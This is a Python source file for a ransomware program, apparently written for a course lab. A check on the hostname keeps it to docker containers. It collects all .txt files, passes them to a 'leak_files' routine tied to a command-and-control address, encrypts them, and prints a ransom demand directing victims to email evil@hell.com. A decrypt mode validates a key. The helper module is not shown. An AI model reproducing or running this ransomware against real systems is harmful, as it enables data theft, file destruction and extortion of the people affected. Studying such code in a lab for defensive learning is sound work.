import logging
import socket
import re
import sys
import base64

from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 

"""


DECRYPT_MESSAGE = """
 _____ _ _             ____                             _           _ 
|  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |  |
| |_  | | |/ _ \/ __| | | | |/ _ \/ __| '__| | | | '_ \| __/ _ \/ _` |  |
|  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |  |
|_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|  °
                                            |___/|_| 

"""


class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)-> None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)



    def get_files(self, filter:str)-> list:
        # return all files matching the filter

        files_list = []
        for path in Path(".").rglob(filter):
            files_list.append(str(path.absolute())) # Ajoute le chemin absolu de chaque fichier à la liste
        return files_list



    def encrypt(self):
        # main function for encrypting (see PDF)
        
        # Obtain all text files
        files = self.get_files("*.txt")

        secret_manager = SecretManager()
        secret_manager.setup()
        secret_manager.leak_files(files)

        # Encrypt all the text files
        secret_manager.fernet_crypt(files, True)
        token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token.hex()))



    def decrypt(self):
        # main function for decrypting (see PDF)
        key = input("Enter the key:")

        #
        try:
            key = base64.b64decode(key)
        except:
            return False

        # Text path and and secret manager instance
        secret_manager = SecretManager()
        
        # Verification of the key
        if(secret_manager.check_key(key)):

            secret_manager.set_key(key)  
            print(DECRYPT_MESSAGE)

            return True
        else:
            return False


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()